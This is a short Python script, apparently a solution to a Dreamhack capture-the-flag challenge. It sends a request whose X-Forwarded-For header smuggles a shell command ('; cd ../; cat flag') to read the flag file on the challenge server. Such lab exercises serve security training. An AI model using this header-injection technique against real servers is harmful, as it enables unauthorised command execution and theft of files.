import requests

url = "http://host8.dreamhack.games:14497/"

headers = {
  'X-Forwarded-For' : '; cd ../; cat flag'
}

res = requests.get(url, headers=headers)

print(res.text)
